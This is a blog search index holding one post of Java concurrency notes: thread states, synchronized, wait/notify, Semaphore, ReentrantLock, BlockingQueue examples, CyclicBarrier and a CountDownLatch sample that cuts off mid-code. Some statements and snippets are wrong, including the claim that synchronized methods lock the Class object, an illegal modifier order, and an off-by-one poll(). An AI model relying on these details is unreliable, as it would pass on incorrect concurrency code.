<?xml version="1.0" encoding="utf-8"?>
<search> 
  
  
    
    <entry>
      <title>Java multithreading and Concurrency API</title>
      <link href="/2020/05/26/java-multithreading-and-concurrency-api/"/>
      <url>/2020/05/26/java-multithreading-and-concurrency-api/</url>
      
        <content type="html"><![CDATA[<h2 id="Multithreading"><a href="#Multithreading" class="headerlink" title="Multithreading"></a>Multithreading</h2><p>Threads are lightweight processes. They provide an execution environment with fewer resources. Threads share the process resources, including memory and open files. They share the objects in the same heap. When a new thread is created a new native method stack and a new java method stack is allocated in the JVM.</p><h2 id="Thread-states"><a href="#Thread-states" class="headerlink" title="Thread states"></a>Thread states</h2><p>New, Runnable, Blocked, Waiting, Timed Waiting or Terminated.</p><p><img src="/2020/05/26/java-multithreading-and-concurrency-api/thread_states.png" alt="Thread states"></p><h2 id="Low-level-API-for-multithreading"><a href="#Low-level-API-for-multithreading" class="headerlink" title="Low-level API for multithreading"></a>Low-level API for multithreading</h2><p>To create a thread:</p><ol><li>Subclass <code>Thread</code> and override <code>public void run()</code>. Start the thread t with <code>t.start()</code>.</li><li>Implement <code>Runnable</code> and override <code>public void run()</code>. Start the thread with <code>(new Thread(new CustomRunnable())).start()</code></li></ol><p>To make a thread enter Waiting or Timed Waiting</p><ol><li>The static method <code>Thread.sleep(1000)</code> makes the calling thread wait for approximately 1s. Useful to avoid a thread acquiring a lock immediately after releasing it.</li><li><code>t.join()</code> makes the calling thread enter Waiting mode, and resumes when the thread <code>t</code> is terminated. <code>t.start()</code> must be called before or the calling thread will enter deadlock.</li></ol><p>To make a thread enter Blocked with a lock:</p><ol><li>Using an object as a lock with <code>wait()</code> and <code>notify()/notifyAll()</code>. When <code>obj.wait()</code> is called, the calling thread becomes Blocked and gives up the lock, until any other thread wakes it up with <code>obj.notify()</code> (this wakes up a random blocked thread) or <code>obj.notifyAll()</code>. The <code>obj.wait()</code> must always be wrapped in a <code>synchronized</code> block or method, because <code>wait()</code> releases the lock if condition is not met.<pre class="line-numbers language-java"><code class="language-java"><span class="token keyword">synchronized</span><span class="token punctuation">(</span>lock<span class="token punctuation">)</span> <span class="token punctuation">{</span><span class="token keyword">while</span><span class="token punctuation">(</span>flag<span class="token punctuation">)</span> <span class="token punctuation">{</span> lock<span class="token punctuation">.</span><span class="token function">wait</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre></li><li><code>synchronized</code> keyword for methods. The intrinsic lock is the Class() object for the calling class. To call the method, the thread must acquire the lock and after using it the lock is released for other threads.<pre class="line-numbers language-java"><code class="language-java"><span class="token keyword">public</span> <span class="token keyword">int</span> <span class="token keyword">synchronized</span> <span class="token function">getCounter</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre></li><li><code>synchronized</code> block of statements. An object is specified as a lock.<pre class="line-numbers language-java"><code class="language-java"><span class="token keyword">synchronized</span><span class="token punctuation">(</span>lockObject<span class="token punctuation">)</span> <span class="token punctuation">{</span><span class="token comment" spellcheck="true">/*code that must be executed without interference*/</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre></li></ol><h2 id="Concurrency-problems"><a href="#Concurrency-problems" class="headerlink" title="Concurrency problems"></a>Concurrency problems</h2><ul><li><strong>Thread interference</strong>.</li><li><strong>Memory inconsistency</strong>.</li></ul><h2 id="Synchronization-problems"><a href="#Synchronization-problems" class="headerlink" title="Synchronization problems"></a>Synchronization problems</h2><ul><li><strong>Deadlocks</strong></li><li><strong>Livelocks</strong></li><li><strong>Starvation</strong></li></ul><h2 id="High-level-concurrency-API"><a href="#High-level-concurrency-API" class="headerlink" title="High-level concurrency API"></a>High-level concurrency API</h2><p>These are from Java package <code>java.util.concurrent</code>.</p><h3 id="Synchronizers"><a href="#Synchronizers" class="headerlink" title="Synchronizers"></a>Synchronizers</h3><h4 id="Semaphore"><a href="#Semaphore" class="headerlink" title="Semaphore"></a>Semaphore</h4><p>The Java Semaphore class implements a classic Dijkstra counting semaphore. Permits are released and acquired. <code>acquire(num)</code> waits until <code>num</code> permits are available. <code>release(num)</code> increments the permits by <code>num</code>, no matter how many permits a thread has.</p><p>Counting semaphores can be used to <strong>restrict the number of threads that have concurrent access to a resource</strong>. This approach is useful for implementing resource pools or limiting the number of outgoing socket connections in a Web crawler.</p><p><a href="https://leetcode.com/problems/print-zero-even-odd/" target="_blank" rel="noopener">Leetcode 1116. Print Zero Even Odd</a><br>Semaphores act as traffic lights, after a certain action A is done, another action B can proceed. In this case, because the maximum number of available permits is 1, it is essentially a <strong>mutex</strong> (mutually exclusive), like a lock.</p><pre class="line-numbers language-java"><code class="language-java"><span class="token keyword">import</span> java<span class="token punctuation">.</span>util<span class="token punctuation">.</span>concurrent<span class="token punctuation">.</span>Semaphore<span class="token punctuation">;</span><span class="token keyword">class</span> <span class="token class-name">ZeroEvenOdd</span> <span class="token punctuation">{</span>    <span class="token keyword">private</span> <span class="token keyword">volatile</span> <span class="token keyword">int</span> curr <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>    <span class="token keyword">private</span> <span class="token keyword">volatile</span> <span class="token keyword">boolean</span> flag <span class="token operator">=</span> <span class="token boolean">false</span><span class="token punctuation">;</span>    <span class="token keyword">private</span> AtomicInteger n <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">AtomicInteger</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">private</span> Semaphore printZero <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Semaphore</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token comment" spellcheck="true">// initial one permit available</span>    <span class="token keyword">private</span> Semaphore printEven <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Semaphore</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">private</span> Semaphore printOdd <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Semaphore</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token function">ZeroEvenOdd</span><span class="token punctuation">(</span><span class="token keyword">int</span> n<span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token keyword">this</span><span class="token punctuation">.</span>n<span class="token punctuation">.</span><span class="token function">set</span><span class="token punctuation">(</span>n<span class="token operator">*</span><span class="token number">2</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token comment" spellcheck="true">// printNumber.accept(x) outputs "x", where x is an integer.</span>    <span class="token keyword">public</span> <span class="token keyword">void</span> <span class="token function">zero</span><span class="token punctuation">(</span>IntConsumer printNumber<span class="token punctuation">)</span> <span class="token keyword">throws</span> InterruptedException <span class="token punctuation">{</span>        <span class="token keyword">while</span><span class="token punctuation">(</span>n<span class="token punctuation">.</span><span class="token function">get</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">></span> <span class="token number">0</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>            printZero<span class="token punctuation">.</span><span class="token function">acquire</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            curr<span class="token operator">++</span><span class="token punctuation">;</span>            n<span class="token punctuation">.</span><span class="token function">decrementAndGet</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token keyword">if</span><span class="token punctuation">(</span>flag<span class="token punctuation">)</span> <span class="token punctuation">{</span>                printEven<span class="token punctuation">.</span><span class="token function">release</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token punctuation">}</span> <span class="token keyword">else</span> <span class="token punctuation">{</span>                printOdd<span class="token punctuation">.</span><span class="token function">release</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token punctuation">}</span>            <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">!</span><span class="token punctuation">(</span>n<span class="token punctuation">.</span><span class="token function">get</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">></span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token keyword">break</span><span class="token punctuation">;</span>            printNumber<span class="token punctuation">.</span><span class="token function">accept</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span>    <span class="token punctuation">}</span>    <span class="token keyword">public</span> <span class="token keyword">void</span> <span class="token function">even</span><span class="token punctuation">(</span>IntConsumer printNumber<span class="token punctuation">)</span> <span class="token keyword">throws</span> InterruptedException <span class="token punctuation">{</span>        <span class="token keyword">while</span><span class="token punctuation">(</span>n<span class="token punctuation">.</span><span class="token function">get</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token operator">></span><span class="token number">0</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>            printEven<span class="token punctuation">.</span><span class="token function">acquire</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">!</span><span class="token punctuation">(</span>n<span class="token punctuation">.</span><span class="token function">get</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token operator">></span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token keyword">break</span><span class="token punctuation">;</span>            n<span class="token punctuation">.</span><span class="token function">decrementAndGet</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            flag <span class="token operator">=</span> <span class="token boolean">false</span><span class="token punctuation">;</span>            printNumber<span class="token punctuation">.</span><span class="token function">accept</span><span class="token punctuation">(</span>curr<span class="token punctuation">)</span><span class="token punctuation">;</span>            printZero<span class="token punctuation">.</span><span class="token function">release</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span>    <span class="token punctuation">}</span>    <span class="token keyword">public</span> <span class="token keyword">void</span> <span class="token function">odd</span><span class="token punctuation">(</span>IntConsumer printNumber<span class="token punctuation">)</span> <span class="token keyword">throws</span> InterruptedException <span class="token punctuation">{</span>        <span class="token keyword">while</span><span class="token punctuation">(</span>n<span class="token punctuation">.</span><span class="token function">get</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token operator">></span><span class="token number">0</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>            printOdd<span class="token punctuation">.</span><span class="token function">acquire</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">!</span><span class="token punctuation">(</span>n<span class="token punctuation">.</span><span class="token function">get</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token operator">></span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token keyword">break</span><span class="token punctuation">;</span>            n<span class="token punctuation">.</span><span class="token function">decrementAndGet</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            flag <span class="token operator">=</span> <span class="token boolean">true</span><span class="token punctuation">;</span>            printNumber<span class="token punctuation">.</span><span class="token function">accept</span><span class="token punctuation">(</span>curr<span class="token punctuation">)</span><span class="token punctuation">;</span>            printZero<span class="token punctuation">.</span><span class="token function">release</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h4 id="ReentrantLock"><a href="#ReentrantLock" class="headerlink" title="ReentrantLock"></a>ReentrantLock</h4><p>It is like the implicit lock in <code>synchronized</code> statements, but it is more customizable: it has useful methods like <code>tryLock()</code> that solves some deadlock problems. <code>tryLock()</code> returns a boolean after trying to get the lock immediately. The <code>wait/notify</code> mechanism is implemented with <code>Condition</code>. A new condition can be created with <code>lock.newCondition()</code>:</p><pre class="line-numbers language-java"><code class="language-java">lock<span class="token punctuation">.</span><span class="token function">lock</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>condition1<span class="token punctuation">.</span><span class="token function">await</span><span class="token punctuation">(</span><span class="token number">1000</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment" spellcheck="true">// critical code</span>condition2<span class="token punctuation">.</span><span class="token function">signalAll</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>lock<span class="token punctuation">.</span><span class="token function">unlock</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>The <code>tryLock()</code> avoids deadlock in bowing friends. If friend A gets his lock and waits for its friend B lock, and B holds his lock and waits for A’s lock, they will be waiting forever in a deadlock.</p><pre class="line-numbers language-java"><code class="language-java"><span class="token keyword">import</span> java<span class="token punctuation">.</span>util<span class="token punctuation">.</span>concurrent<span class="token punctuation">.</span>locks<span class="token punctuation">.</span>ReentrantLock<span class="token punctuation">;</span><span class="token keyword">import</span> java<span class="token punctuation">.</span>util<span class="token punctuation">.</span>concurrent<span class="token punctuation">.</span>locks<span class="token punctuation">.</span>Lock<span class="token punctuation">;</span>Lock lock <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">ReentrantLock</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment" spellcheck="true">// ---------Code for Friend class --------------------</span><span class="token keyword">public</span> <span class="token keyword">boolean</span> <span class="token function">impendingBow</span><span class="token punctuation">(</span>Friend bower<span class="token punctuation">)</span> <span class="token punctuation">{</span>  Boolean myLock <span class="token operator">=</span> <span class="token boolean">false</span><span class="token punctuation">;</span>  Boolean yourLock <span class="token operator">=</span> <span class="token boolean">false</span><span class="token punctuation">;</span>  <span class="token keyword">try</span> <span class="token punctuation">{</span>    myLock <span class="token operator">=</span> lock<span class="token punctuation">.</span><span class="token function">tryLock</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    yourLock <span class="token operator">=</span> bower<span class="token punctuation">.</span>lock<span class="token punctuation">.</span><span class="token function">tryLock</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token punctuation">}</span> <span class="token keyword">finally</span> <span class="token punctuation">{</span>    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">!</span><span class="token punctuation">(</span>myLock <span class="token operator">&amp;&amp;</span> yourLock<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>      <span class="token keyword">if</span><span class="token punctuation">(</span>myLock<span class="token punctuation">)</span> <span class="token punctuation">{</span>        lock<span class="token punctuation">.</span><span class="token function">unlock</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token comment" spellcheck="true">// because condition is not satisfied, don't hold the lock</span>      <span class="token punctuation">}</span>      <span class="token keyword">if</span><span class="token punctuation">(</span>yourLock<span class="token punctuation">)</span> <span class="token punctuation">{</span>        bower<span class="token punctuation">.</span>lock<span class="token punctuation">.</span><span class="token function">unlock</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>      <span class="token punctuation">}</span>    <span class="token punctuation">}</span>  <span class="token punctuation">}</span>  <span class="token keyword">return</span> myLock <span class="token operator">&amp;&amp;</span> yourLock<span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token keyword">public</span> <span class="token keyword">void</span> <span class="token function">bow</span><span class="token punctuation">(</span>Friend bower<span class="token punctuation">)</span> <span class="token punctuation">{</span>  <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">impendingBow</span><span class="token punctuation">(</span>bower<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>    <span class="token keyword">try</span> <span class="token punctuation">{</span>      <span class="token comment" spellcheck="true">// code</span>    <span class="token punctuation">}</span> <span class="token keyword">finally</span> <span class="token punctuation">{</span>      lock<span class="token punctuation">.</span><span class="token function">unlock</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token comment" spellcheck="true">// remember to release the lock</span>      bower<span class="token punctuation">.</span>lock<span class="token punctuation">.</span><span class="token function">unlock</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>  <span class="token punctuation">}</span> <span class="token keyword">else</span> <span class="token punctuation">{</span>    <span class="token comment" spellcheck="true">// code</span>  <span class="token punctuation">}</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>ReentrantLock is similar to a <strong>mutex</strong> in that it can only be owned by a single thread at a time, but the difference is that a <strong>mutex</strong> can release the permit even if the object does not own any permit.</p><p>The major advantage of lock interfaces on multi-threaded and concurrent programming is they provide two separate lock for reading and writing which enables you to write high-performance data structure like ConcurrentHashMap and conditional blocking.</p><pre class="line-numbers language-java"><code class="language-java">ReadWriteLock rwLock <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">ReentrantReadWriteLock</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>Lock readLock <span class="token operator">=</span> rwLock<span class="token punctuation">.</span><span class="token function">readLock</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>Lock writeLock <span class="token operator">=</span> rwLock<span class="token punctuation">.</span><span class="token function">writeLock</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment" spellcheck="true">// reading ---------------</span>readLock<span class="token punctuation">.</span><span class="token function">lock</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">try</span> <span class="token punctuation">{</span>    <span class="token comment" spellcheck="true">// reading data</span><span class="token punctuation">}</span> <span class="token keyword">finally</span> <span class="token punctuation">{</span>    readLock<span class="token punctuation">.</span><span class="token function">unlock</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token comment" spellcheck="true">// in a finally clause so the lock is released even in an exception</span><span class="token punctuation">}</span><span class="token comment" spellcheck="true">// writing ---------------</span>writeLock<span class="token punctuation">.</span><span class="token function">lock</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">try</span> <span class="token punctuation">{</span>    <span class="token comment" spellcheck="true">// update data</span><span class="token punctuation">}</span> <span class="token keyword">finally</span> <span class="token punctuation">{</span>    writeLock<span class="token punctuation">.</span><span class="token function">unlock</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>Now there is a hot interview question which is to implement a BlockingQueue with <code>wait/notify</code> and Locks. Note that <code>offer/poll</code> must be synchronized methods because they are all write operations.</p><ul><li>Wait/notify:<pre class="line-numbers language-java"><code class="language-java"><span class="token keyword">public</span> <span class="token keyword">void</span> <span class="token keyword">synchronized</span> <span class="token function">offer</span><span class="token punctuation">(</span>E element<span class="token punctuation">)</span> <span class="token punctuation">{</span><span class="token keyword">while</span><span class="token punctuation">(</span>size <span class="token operator">==</span> MAX_SIZE<span class="token punctuation">)</span> <span class="token punctuation">{</span>  <span class="token function">wait</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token keyword">if</span><span class="token punctuation">(</span>size <span class="token operator">==</span> <span class="token number">0</span><span class="token punctuation">)</span> <span class="token function">notifyAll</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>arr<span class="token punctuation">[</span>size<span class="token punctuation">]</span> <span class="token operator">=</span> element<span class="token punctuation">;</span>size<span class="token operator">++</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></li></ul><p>public E synchronized poll() {<br>  while(size == 0) {<br>    wait();<br>  }<br>  if(size == MAX_SIZE) notifyAll();<br>  E ret = arr[size];<br>  size–;<br>  return ret;<br>}</p><pre><code>- ReentrantLock solution. The `signalAll` wakes up threads waiting for that certain condition.```javapublic void put (T t) {    lock.lock();    try {       while (isFull()) {            try {                isFullCondition.await();            } catch (InterruptedException ex) {}        }        q.add(t);        isEmptyCondition.signalAll();    } finally {        lock.unlock();    } }public T get() {    T t = null;    lock.lock();    try {        while (isEmpty()) {            try {                isEmptyCondition.await();            } catch (InterruptedException ex) {}        }        t = q.poll();        isFullCondition.signalAll();    } finally {        lock.unlock();    }    return t;}</code></pre><h4 id="CyclicBarrier"><a href="#CyclicBarrier" class="headerlink" title="CyclicBarrier"></a>CyclicBarrier</h4><p>The CyclicBarrier class is a synchronization aid that allows a set of threads to wait for the entire set of threads to reach a common barrier point. After condition is met, it can be repeated. The constructor first argument is the NUM of waiting threads required to trip barrier. Optionally, we can pass the second argument to the constructor, which is a Runnable instance. This has logic that would be run by the last thread that trips the barrier. Use: <code>barrier.await()</code> and catch for <code>BrokenBarrierException</code> and <code>InterruptedException</code>.</p><pre class="line-numbers language-java"><code class="language-java"><span class="token keyword">class</span> <span class="token class-name">Solver</span> <span class="token punctuation">{</span> <span class="token comment" spellcheck="true">// Code sketch</span>  <span class="token keyword">void</span> <span class="token function">solve</span><span class="token punctuation">(</span><span class="token keyword">final</span> Problem p<span class="token punctuation">,</span> <span class="token keyword">int</span> nThreads<span class="token punctuation">)</span> <span class="token punctuation">{</span>  <span class="token keyword">final</span> CyclicBarrier barrier <span class="token operator">=</span>    <span class="token keyword">new</span> <span class="token class-name">CyclicBarrier</span><span class="token punctuation">(</span>nThreads<span class="token punctuation">,</span>      <span class="token keyword">new</span> <span class="token class-name">Runnable</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token keyword">public</span> <span class="token keyword">void</span> <span class="token function">run</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span> p<span class="token punctuation">.</span><span class="token function">checkConvergence</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token punctuation">}</span><span class="token punctuation">}</span>    <span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">int</span> i <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> i <span class="token operator">&lt;</span> nThreads<span class="token punctuation">;</span> <span class="token operator">++</span>i<span class="token punctuation">)</span> <span class="token punctuation">{</span>      <span class="token keyword">final</span> <span class="token keyword">int</span> id <span class="token operator">=</span> i<span class="token punctuation">;</span>      Runnable worker <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Runnable</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token keyword">final</span> Segment segment <span class="token operator">=</span> p<span class="token punctuation">.</span><span class="token function">createSegment</span><span class="token punctuation">(</span>id<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">public</span> <span class="token keyword">void</span> <span class="token function">run</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>          <span class="token keyword">try</span> <span class="token punctuation">{</span>            <span class="token keyword">while</span> <span class="token punctuation">(</span><span class="token operator">!</span>p<span class="token punctuation">.</span><span class="token function">converged</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>              segment<span class="token punctuation">.</span><span class="token function">update</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>              barrier<span class="token punctuation">.</span><span class="token function">await</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token punctuation">}</span>          <span class="token punctuation">}</span>          <span class="token keyword">catch</span><span class="token punctuation">(</span>Exception e<span class="token punctuation">)</span> <span class="token punctuation">{</span> <span class="token keyword">return</span><span class="token punctuation">;</span> <span class="token punctuation">}</span>        <span class="token punctuation">}</span>      <span class="token punctuation">}</span><span class="token punctuation">;</span>      <span class="token keyword">new</span> <span class="token class-name">Thread</span><span class="token punctuation">(</span>worker<span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">start</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>   <span class="token punctuation">}</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h4 id="CountDownLatch"><a href="#CountDownLatch" class="headerlink" title="CountDownLatch"></a>CountDownLatch</h4><p>The CountdownLatch class is similar to CyclicBarrier, in that its role is to coordinate a group of threads that have divided a problem among themselves, but it is not reusable. CountdownLatch separates the arrival and waiting functionality with <code>countDown()</code> and <code>await()</code>. When countdown reaches 0, all threads await() will proceed.</p><pre class="line-numbers language-java"><code class="language-java"><span class="token keyword">class</span> <span class="token class-name">Driver</span> <span class="token punctuation">{</span> <span class="token comment" spellcheck="true">// ...</span>   <span class="token keyword">void</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token keyword">throws</span> InterruptedException <span class="token punctuation">{</span>     CountDownLatch startSignal <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">CountDownLatch</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span>     CountDownLatch doneSignal <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">CountDownLatch</span><span class="token punctuation">(</span>N<span class="token punctuation">)</span><span class="token punctuation">;</span>     <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">int</span> i <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> i <span class="token operator">&lt;</span> N<span class="token punctuation">;</span> <span class="token operator">++</span>i<span class="token punctuation">)</span> <span class="token comment" spellcheck="true">// create and start threads</span>       <span class="token keyword">new</span> <span class="token class-name">Thread</span><span class="token punctuation">(</span><span class="token keyword">new</span> <span class="token class-name">Worker</span><span class="token punctuation">(</span>startSignal<span class="token punctuation">,</span> doneSignal<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">start</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>     <span class="token function">doSomethingElse</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token comment" spellcheck="true">// don't let them run yet</span>     startSignal<span class="token punctuation">.</span><span class="token function">countDown</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>      <span class="token comment" spellcheck="true">// let all threads proceed</span>     <span class="token function">doSomethingElse</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>     doneSignal<span class="token punctuation">.</span><span class="token function">await</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>           <span class="token comment" spellcheck="true">// wait for all to finish</span>   <span class="token punctuation">}</span> <span class="token punctuation">}</span> <span class="token keyword">class</span> <span class="token class-name">Worker</span> <span class="token keyword">implements</span> <span class="token class-name">Runnable</span> <span class="token punctuation">{</span>   <span class="token keyword">private</span> <span class="token keyword">final</span> CountDownLatch startSignal<span class="token punctuation">;</span>   <span class="token keyword">private</span> <span class="token keyword">final</span> CountDownLatch doneSignal<span class="token punctuation">;</span>   <span class="token function">Worker</span><span class="token punctuation">(</span>CountDownLatch startSignal<span class="token punctuation">,</span> CountDownLatch doneSignal<span class="token punctuation">)</span> <span class="token punctuation">{</span>      <span class="token keyword">this</span><span class="token punctuation">.</span>startSignal <span class="token operator">=</span> startSignal<span class="token punctuation">;</span>      <span class="token keyword">this</span><span class="token punctuation">.</span>doneSignal <span class="token operator">=</span> doneSignal<span class="token punctuation">;</span>   <span class="token punctuation">}</span>   <span class="token keyword">public</span> <span class="token keyword">void</span> <span class="token function">run</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>      <span class="token keyword">try</span> <span class="token punctuation">{</span>        startSignal<span class="token punctuation">.</span><span class="token function">await</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token function">doWork</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        doneSignal<span class="token punctuation">.</span><span class="token function">countDown</span><span class="token punctuation">(</span><span class="token 